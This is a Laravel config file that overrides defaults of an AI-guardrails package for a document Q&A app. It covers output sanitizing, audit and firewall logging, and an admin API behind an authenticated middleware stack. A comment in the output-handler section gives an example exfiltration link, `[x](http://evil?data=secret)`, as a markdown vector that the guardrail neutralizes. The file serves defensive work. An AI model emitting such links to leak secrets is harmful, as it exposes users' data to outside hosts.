<?php

declare(strict_types=1);

/*
|--------------------------------------------------------------------------
| AI Guardrails — HOST overrides (AskMyDocs)
|--------------------------------------------------------------------------
|
| Vendor defaults live in `vendor/padosoft/laravel-ai-guardrails/config/
| ai-guardrails.php`. `mergeConfigFrom` does a SHALLOW array_merge, so any
| top-level key declared here REPLACES the package's version of that key
| entirely — every key we DON'T declare (enabled, input_screen,
| output_handler, modes, normalization, pattern_safety, events,
| audit_hygiene, retention, tool_authorization, hitl, mcp, …) keeps the
| package default untouched.
|
| The package ships sane defaults: master `enabled` ON, the two chat
| controls (input_screen + output_handler) ENABLED in `enforce` mode, the
| firewall + HITL also present but HITL default-OFF. We override only:
|   1. the persistence STORES → `database` (so the admin panel + API have
|      real rows to read; the package default is `null` = no-op);
|   2. the HTTP API surface — turned ON and wrapped in the SECURITY-CRITICAL
|      authenticated admin stack (R32). The package default is
|      `api.enabled=false` + `api.middleware=[]`, which would either 404 the
|      admin SPA or (if enabled bare) fail-close at boot.
|
| The guardrails tables are GLOBAL security infrastructure (injection
| attempts, sanitization counters, firewall rejections across the whole
| app) — like `embedding_cache`, they are intentionally NOT tenant-scoped.
| Isolation is the admin RBAC boundary below, not a tenant column.
|
*/

return [

    /*
    |--------------------------------------------------------------------------
    | Output handler — posture tuned for a MARKDOWN RAG answer
    |--------------------------------------------------------------------------
    | The package default escapes ALL HTML (`sanitize_html=true`) and redacts
    | PII on the answer. For AskMyDocs that default is wrong on two counts:
    |
    |   - the chat answer is rendered as MARKDOWN by the SPA (react-markdown
    |     WITHOUT rehype-raw), so raw HTML is shown as literal text, never
    |     executed — the markdown renderer is the XSS boundary, not this API
    |     layer. HTML-escaping here would only mangle legitimate prose
    |     (apostrophes → `&#039;`, quotes → `&quot;`) and, worse, the contents
    |     of fenced code blocks (`<` → `&lt;` shown literally) — a real
    |     regression for a docs Q&A system that answers with code. So
    |     `sanitize_html=false`.
    |
    |   - PII redaction is ALREADY wired across AskMyDocs via
    |     padosoft/laravel-pii-redactor (RedactorEngine, four touch-points).
    |     Enabling the guardrail's own redactor would double-redact, so
    |     `redact_pii=false` here — the existing layer owns that concern.
    |
    | What the output guardrail uniquely adds — and KEEPS enforced — is
    | `neutralize_markdown`: defanging markdown link/image EXFILTRATION vectors
    | the model might emit (`[x](http://evil?data=secret)`), which the FE would
    | otherwise render as a live link. Citations ship in the structured
    | `citations` array, not as body markdown links, so neutralizing body links
    | costs no legitimate UX. Mode stays `enforce` (the package default).
    */
    'output_handler' => [
        'enabled' => env('AI_GUARDRAILS_OUTPUT_HANDLER_ENABLED', true),
        'sanitize_html' => env('AI_GUARDRAILS_SANITIZE_HTML', false),
        'neutralize_markdown' => env('AI_GUARDRAILS_NEUTRALIZE_MARKDOWN', true),
        'html_mode' => env('AI_GUARDRAILS_HTML_MODE', 'escape'),
        'redact_pii' => env('AI_GUARDRAILS_REDACT_PII', false),
        'sanitize_tool_calls' => env('AI_GUARDRAILS_SANITIZE_TOOL_CALLS', false),
    ],

    /*
    |--------------------------------------------------------------------------
    | Persistence stores → database
    |--------------------------------------------------------------------------
    | Flip every append-only store from the package `null` default to
    | `database` so the audit trail, firewall rejections, output-sanitization
    | counters and settings actually persist (the admin SPA + the HTTP API
    | read these). The migrations ship in database/migrations (published from
    | the package) + tests/database/migrations (SQLite mirror). Each is still
    | env-overridable for a deployment that wants a different store.
    */
    'audit' => [
        'store' => env('AI_GUARDRAILS_AUDIT_STORE', 'database'),
        'connection' => env('AI_GUARDRAILS_AUDIT_CONNECTION'),
        'table' => env('AI_GUARDRAILS_AUDIT_TABLE', 'ai_guardrails_injection_audit'),
    ],
    'firewall_log' => [
        'store' => env('AI_GUARDRAILS_FIREWALL_STORE', 'database'),
        'connection' => env('AI_GUARDRAILS_FIREWALL_CONNECTION'),
        'table' => env('AI_GUARDRAILS_FIREWALL_TABLE', 'ai_guardrails_firewall_rejections'),
    ],
    'output_stats' => [
        'store' => env('AI_GUARDRAILS_OUTPUT_STATS_STORE', 'database'),
        'connection' => env('AI_GUARDRAILS_OUTPUT_STATS_CONNECTION'),
        'table' => env('AI_GUARDRAILS_OUTPUT_STATS_TABLE', 'ai_guardrails_output_stats'),
    ],
    'settings' => [
        'store' => env('AI_GUARDRAILS_SETTINGS_STORE', 'database'),
        'connection' => env('AI_GUARDRAILS_SETTINGS_CONNECTION'),
        'table' => env('AI_GUARDRAILS_SETTINGS_TABLE', 'ai_guardrails_settings'),
        // Mirror the package allow-list of runtime-overridable keys verbatim —
        // overriding the `settings` key replaces it wholesale (shallow merge),
        // so the allow-list must be restated or the admin's PUT /settings would
        // accept nothing.
        'overridable' => [
            'tool_firewall.enabled', 'tool_firewall.reject_unknown_arguments',
            'input_screen.enabled', 'input_screen.refusal_message',
            'output_handler.enabled', 'output_handler.sanitize_html',
            'output_handler.neutralize_markdown', 'output_handler.redact_pii', 'output_handler.html_mode',
            'hitl.enabled', 'hitl.fallback',
            'modes.tool_firewall', 'modes.input_screen', 'modes.output_handler', 'modes.hitl',
            'normalization.enabled', 'pattern_safety.on_match_error',
            'tool_authorization.enabled', 'tool_authorization.owner_key_depth', 'tool_authorization.destructive_match',
            'tool_firewall.owner_keys', 'input_screen.patterns', 'hitl.destructive_tools',
            'normalization.nfkc', 'normalization.strip_zero_width', 'normalization.casefold',
            'normalization.decode_base64_blobs', 'normalization.fold_confusables', 'normalization.max_prompt_length',
            'audit_hygiene.prompt_storage', 'retention.days', 'retention.strategy',
        ],
    ],
    'settings_audit' => [
        'store' => env('AI_GUARDRAILS_SETTINGS_AUDIT_STORE', 'database'),
        'connection' => env('AI_GUARDRAILS_SETTINGS_AUDIT_CONNECTION'),
        'table' => env('AI_GUARDRAILS_SETTINGS_AUDIT_TABLE', 'ai_guardrails_settings_changes'),
    ],
    // HITL stays default-OFF (the control is off), but keep its sidecar store
    // on `database` so that if an operator enables HITL the parked requests
    // are persisted for the approvals screen.
    'hitl_requests' => [
        'store' => env('AI_GUARDRAILS_HITL_REQUESTS_STORE', 'database'),
        'connection' => env('AI_GUARDRAILS_HITL_REQUESTS_CONNECTION'),
        'table' => env('AI_GUARDRAILS_HITL_REQUESTS_TABLE', 'ai_guardrails_hitl_requests'),
    ],

    /*
    |--------------------------------------------------------------------------
    | HTTP API — SECURITY-CRITICAL middleware override (R32)
    |--------------------------------------------------------------------------
    | The package ships `api.enabled=false` + `api.middleware=[]`. The admin
    | SPA (laravel-ai-guardrails-admin, W3) consumes this API, so we turn it ON
    | and mount it UNDER the full authenticated admin stack. The package
    | controllers do NO internal authorization, so this middleware IS the
    | authorization boundary:
    |   - cookies + session so the Sanctum STATEFUL guard sees the SPA cookie;
    |   - `auth:sanctum` → a guest is 401;
    |   - `tenant.authorize` → a valid authenticated tenant session (the data
    |     is global, but we still require an authenticated operator in a tenant
    |     context, consistent with every other admin API);
    |   - `guardrails.authorize` → method-aware Gate: safe methods (GET/HEAD)
    |     require `viewAiGuardrails` (super-admin + admin); mutating methods
    |     (PUT /settings, POST /approvals/*) require `manageAiGuardrails`
    |     (super-admin only).
    | Prefix is aligned under `api/admin/*` like every other admin API.
    */
    'api' => [
        'enabled' => env('AI_GUARDRAILS_API_ENABLED', true),
        'prefix' => env('AI_GUARDRAILS_API_PREFIX', 'api/admin/ai-guardrails'),
        'middleware' => [
            \Illuminate\Cookie\Middleware\EncryptCookies::class,
            \Illuminate\Session\Middleware\StartSession::class,
            'auth:sanctum',
            'tenant.authorize',
            'guardrails.authorize',
        ],
    ],
];
